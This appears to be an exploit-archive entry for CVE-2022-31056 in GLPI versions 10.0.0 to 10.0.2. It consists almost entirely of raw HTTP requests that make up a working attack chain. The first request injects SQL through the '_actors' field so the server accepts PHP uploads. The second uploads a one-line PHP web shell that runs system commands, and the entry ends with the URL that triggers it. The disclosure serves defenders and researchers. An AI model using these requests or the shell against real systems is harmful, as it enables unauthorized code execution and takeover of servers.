@@ -1,0 +1,75 @@
+id: 38463
+date: 04/03/2023
+title: GLPI v10.0.2 - SQL Injection (Authentication Depends on Configuration) Vulnerability
+author: Nuri Çilengir
+cves: CVE-2022-31056
+
+# ADVISORY INFORMATION
+# Exploit Title: GLPI  v10.0.2 - SQL Injection (Authentication Depends on Configuration)
+# Application: GLPI >=10.0.0, < 10.0.3
+# Author: Nuri Çilengir 
+# Vendor Homepage: https://glpi-project.org/
+# Software Link: https://github.com/glpi-project/glpi
+# Advisory: https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/
+# Tested on: Ubuntu 22.04
+# CVE: CVE-2022-31056
+
+# PoC
+POST /front/change.form.php HTTP/1.1
+Host: acme.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Content-Type: multipart/form-data; boundary=---------------------------190705055020145329172298897156
+Content-Length: 4836
+Cookie: glpi_8ac3914e6055f1dc4d1023c9bbf5ce82_rememberme=%5B2%2C%22wSQx0155YofQ
+n53WMozDGuSI1p2KAzxZ392stmrX%22%5D; glpi_8ac3914e6055f1dc4d1023c9bbf5ce82=f3cciacap6rqs2bcoaio5lmikg
+
+-----------------------------190705055020145329172298897156
+Content-Disposition: form-data; name="id"
+0
+-----------------------------190705055020145329172298897156
+Content-Disposition: form-data; name="_glpi_csrf_token"
+752d2ff606bf360d809b682f0d9da9c23b290b31453f493f4924e16e77bbba35
+
+-----------------------------190705055020145329172298897156
+Content-Disposition: form-data; name="_actors"
+{"requester":[],"observer":[],"assign":[{"itemtype":"User","items_id":"2','2',); INSERT INTO `glpi_documenttypes` (`name`, `ext`, `icon`, `mime`, `is_uploadable`) VALUES('PHP', 'php', 'jpg-dist.png', 'application/x-php', 1); ---'","use_notification":"1","alternative_email":""}]}
+
+-----------------------------190705055020145329172298897156--
+
+
+If you manipulate the filename uploaded to the system, the file is placed under /files/_tmp/. HTTP GET request required to trigger the issue is as follows.
+
+POST /ajax/fileupload.php HTTP/1.1
+Host: 192.168.56.113
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Glpi-Csrf-Token: bb1c7f6cd4c1865838b234b4f703172a57c19c276d11eb322936d770d75c6dd7
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------102822935214007887302871396841
+Content-Length: 559
+Origin: http://acme.com
+Cookie: glpi_8ac3914e6055f1dc4d1023c9bbf5ce82_rememberme=%5B2%2C%22wSQx0155YofQn53WMozDGuSI1p2KAzxZ392stmrX%22%5D; glpi_8ac3914e6055f1dc4d1023c9bbf5ce82=f3cciacap6rqs2bcoaio5lmikg
+
+-----------------------------102822935214007887302871396841
+Content-Disposition: form-data; name="name"
+
+_uploader_filename
+-----------------------------102822935214007887302871396841
+Content-Disposition: form-data; name="showfilesize"
+
+1
+-----------------------------102822935214007887302871396841
+Content-Disposition: form-data; name="_uploader_filename[]"; filename="test.php"
+Content-Type: application/x-php
+
+Output: 
+ <?php echo system($_GET['cmd']); ?>
+-----------------------------102822935214007887302871396841--
+
+# POC URL
+http://192.168.56.113/files/_tmp/poc.php?cmd=
+
+#  0day.today [2023-04-19]  #
